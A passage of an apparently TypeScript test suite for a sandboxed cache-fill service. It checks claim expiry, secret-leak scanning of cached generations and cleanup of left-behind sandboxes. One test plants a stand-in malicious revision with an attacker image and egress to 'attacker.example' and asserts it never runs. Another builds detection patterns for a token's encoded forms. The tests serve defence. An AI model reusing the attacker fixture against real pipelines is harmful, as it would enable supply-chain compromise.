      (await rowsOf(lease.id)).find((row) => row.id === behind.id)?.status,
    ).toBe("queued");
    await db!
      .updateTable("environment_cache_fills")
      .set({ queued_at: sql<Date>`now() - interval '2 hours'` })
      .where("id", "=", behind.id)
      .execute();
    await fills.dispatch();
    expect(
      (await rowsOf(lease.id)).find((row) => row.id === behind.id)?.status,
    ).toBe("failed");
  });

  it("refuses to publish a generation that holds a setup secret's value", async () => {
    const { lease, fake } = await addMachine("q");
    await workspace(lease.id);
    fake.behavior.scanFinds = "NPM_TOKEN\n";
    fake.commands.length = 0;
    await fillAll();
    expect((await rowsOf(lease.id))[0]).toMatchObject({
      status: "failed",
      error: expect.stringContaining("holds the value of NPM_TOKEN"),
    });
    // Searched from the helper, never the fill's sandbox, with the value's
    // forms (base64 among them) in a file, never in a command line.
    const scan = fake.commands.find((c) => c.command.includes("grep -rqF -f"));
    const helper = fake.created.find(
      (entry) => entry.opts.labels?.purpose === "cache-check",
    );
    expect(scan?.sandboxId).toBe(helper?.id);
    expect(scan?.command).not.toContain(TOKEN);
    const patterns = fake.uploads.find(
      (upload) => upload.sandboxId === helper?.id,
    )?.files.NPM_TOKEN;
    expect(patterns?.split("\n")).toEqual(
      expect.arrayContaining([
        TOKEN,
        Buffer.from(TOKEN).toString("base64"),
        Buffer.from(TOKEN).toString("base64url"),
        // As it reads inside a longer base64 value, at each alignment.
        ...[1, 2].map((offset) =>
          Buffer.concat([Buffer.alloc(offset), Buffer.from(TOKEN)])
            .toString("base64")
            .slice(4, -4),
        ),
      ]),
    );
    expect(fake.uploads.some((upload) => "OTHER" in upload.files)).toBe(false);
  });

  it("records its check helper on the fill while it runs, and a later pass removes one a stopped replica left", async () => {
    const { lease, fake } = await addMachine("t");
    await workspace(lease.id);
    const seen: Array<string | null> = [];
    fake.behavior.onCommand = async (sandboxId, command) => {
      if (!command.includes("du -sk")) return;
      const [row] = await rowsOf(lease.id);
      seen.push(row?.check_sandbox_id === sandboxId ? "recorded" : null);
    };
    await fillAll();
    expect(seen).toEqual(["recorded"]);
    expect((await rowsOf(lease.id))[0]?.check_sandbox_id).toBeNull();
    // A replica stopped during a check: its helper is still on the machine.
    await db!
      .insertInto("environment_cache_fills")
      .values({
        tenant_id: tenantId,
        project_id: projectId,
        environment_name: "review",
        cache_name: "pnpm",
        worker_node_id: lease.id,
        reason: "requested",
        status: "failed",
        generation: "950",
        check_sandbox_id: "t-left-helper",
      })
      .execute();
    await fills.dispatch();
    expect(fake.destroyed).toContain("t-left-helper");
    expect(
      (await rowsOf(lease.id)).every((row) => row.check_sandbox_id === null),
    ).toBe(true);
  });

  it("empties a generation the checks refuse and retires it", async () => {
    const { lease, fake } = await addMachine("u");
    await workspace(lease.id);
    await fillAll();
    const live = Number((await rowsOf(lease.id))[0]?.generation);
    fake.behavior.sizeKib = 5 * 1024;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "too-big",
    });
    fake.created.length = 0;
    fake.commands.length = 0;
    await fillAll();
    const refused = (await rowsOf(lease.id))[0];
    expect(refused?.error).toContain("its limit is 4 MiB");
    const emptier = fake.created.find(
      (entry) =>
        entry.opts.internal === true &&
        entry.opts.volumes?.[0]?.readOnly === undefined,
    );
    expect(emptier?.opts.volumes).toEqual([
      { key: key(Number(refused?.generation)), path: "/work-cache-check" },
    ]);
    expect(
      fake.commands.some(
        (command) =>
          command.sandboxId === emptier?.id &&
          command.command.includes("-exec rm -rf {} +"),
      ),
    ).toBe(true);
    expect(fake.destroyed).toContain(emptier?.id);
    fake.behavior.sizeKib = 2048;
    const review = await workspace(lease.id);
    expect(review.opts?.volumes?.[0]).toMatchObject({
      key: key(live),
      retire: expect.arrayContaining([key(Number(refused?.generation))]),
    });
  });

  it("fills only from a revision that went live, with that revision's command and checkout", async () => {
    const { lease, fake } = await addMachine("r");
    await workspace(lease.id);
    await fillAll();
    // main moves on to a revision whose deploy has not finished, with
    // another fill command; and one revision's deploy failed.
    const next = await projectManager.publishFiles({
      tenantId,
      projectId,
      files: {
        [PROJECT_MANIFEST_PATH]: manifest(ATTACK, {
          image: "attacker/image:latest",
          setupAllow: ["attacker.example"],
        }),
      },
      message: "Pending",
      author: { name: "Test", email: "test@example.com" },
    });
    if (next.status !== "deployed") throw new Error("not published");
    await db!
      .insertInto("published_revisions")
      .values([
        {
          tenant_id: tenantId,
          project_id: projectId,
          commit_sha: next.commitSha,
          status: "pending",
        },
        {
          tenant_id: tenantId,
          project_id: projectId,
          commit_sha: "e".repeat(40),
          status: "failed",
        },
      ])
      .execute();
    for (const commit of [next.commitSha, "e".repeat(40)])
      await expect(
        fills.request({
          identity: ada,
          projectId,
          environment: "review",
          cache: "pnpm",
          commit,
          idempotencyKey: `not-live-${commit}`,
        }),
      ).rejects.toThrow("went live");
    fake.commands.length = 0;
    const created = fake.created.length;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "live",
    });
    await fillAll();
    const [row] = await rowsOf(lease.id);
    expect(row).toMatchObject({ status: "succeeded", commit_sha: published });
    expect(fake.commands.some((c) => c.command === FILL)).toBe(true);
    expect(fake.commands.some((c) => c.command.includes("attacker"))).toBe(
      false,
    );
    expect(
      fake.commands.some((c) =>
        c.command.includes(`git checkout -q -f --detach ${published}`),
      ),
    ).toBe(true);
    // Its sandbox is built as the live revision declares it, not as main.
    const fillSandbox = fake.created
      .filter((entry) => entry.opts.labels?.purpose === "cache-fill")
      .at(-1);
    expect(
      fillSandbox ? fake.created.indexOf(fillSandbox) : -1,
    ).toBeGreaterThanOrEqual(created);
    expect(fillSandbox?.opts.image).toEqual({
      kind: "oci",
      reference: "node:22",
    });
    expect(fillSandbox?.opts.egress).toEqual({
      mode: "allowlist",
      allow: ["registry.npmjs.org"],
    });
  });

  it("names every generation a lost claim left for retirement, and empties the one its replica left", async () => {
    const { lease, fake } = await addMachine("s");
    await workspace(lease.id);
    await fillAll();
    const live = Number((await rowsOf(lease.id))[0]?.generation);
    // A replica's run took a fill and stopped renewing, leaving its
    // sandbox and generation on the machine.
    const [row] = await db!
      .insertInto("environment_cache_fills")
      .values({
        tenant_id: tenantId,
        project_id: projectId,
        environment_name: "review",
        cache_name: "pnpm",
        worker_node_id: lease.id,
        commit_sha: published,
        reason: "requested",
        status: "running",
        attempts: 1,
        generation: "901",
        claimed_until: sql<Date>`now() - interval '1 minute'`,
      })
      .returning("id")
      .execute();
    const left = await allocations().create({
      identity: ada,
      projectId,
      environmentName: "review",
      workloadKind: "agent",
      rootWorkloadId: row?.id ?? "",
      workerNodeId: lease.id,
      policy: { binding: descriptor, requirements: { workload: "agent" } },
    });
    await db!
      .updateTable("execution_allocations")
      .set({ sandbox_provider_id: "s-left-behind" })
      .where("id", "=", left.id)
      .execute();
    fake.commands.length = 0;
    // Another replica takes it over: a new generation, and the run that
    // loses its claim after deciding to publish never publishes. The run
    // taken over renews slowly, so the takeover lands first.
    const slow = new CacheFillsService({ ...fillDeps, claimRenewMs: 400 });
    let takenOver = false;
    fake.behavior.onDestroy = async (id) => {
      if (takenOver || !id.startsWith("s-sandbox")) return;
      const current = (await rowsOf(lease.id)).find(
        (entry) => entry.id === row?.id,
      );
      if (current?.status !== "running") return;
      takenOver = true;
      await db!
        .updateTable("environment_cache_fills")
        .set({ claimed_until: sql<Date>`now() - interval '1 second'` })
        .where("id", "=", row?.id ?? "")
        .execute();
      expect(await fills.dispatch()).toBe(1);
      await new Promise((resolve) => setTimeout(resolve, 600));
    };
    await slow.dispatch();
    await slow.drain();
    await fills.drain();
    const after = (await rowsOf(lease.id)).find(
      (entry) => entry.id === row?.id,
    );
    expect(after?.status).toBe("succeeded");
    const abandoned = (after?.abandoned_generations ?? []) as number[];
    expect(abandoned.map(Number)).toEqual(expect.arrayContaining([901]));
    expect(abandoned.length).toBeGreaterThanOrEqual(2);
    // What the left-behind sandbox wrote went before it did.
    expect(
      fake.commands.some(
        (command) =>
          command.sandboxId === "s-left-behind" &&
          command.command.includes("-exec rm -rf {} +"),
      ),
    ).toBe(true);
    // The next review sandbox retires every generation but the live one.
    const newest = Number(after?.generation);
    const review = await workspace(lease.id);
    expect(review.opts?.volumes?.[0]?.key).toBe(key(newest));
    expect(review.opts?.volumes?.[0]?.retire).toEqual(
      expect.arrayContaining([
        key(live),
        ...abandoned.map((generation) => key(Number(generation))),
      ]),
    );
  });
});
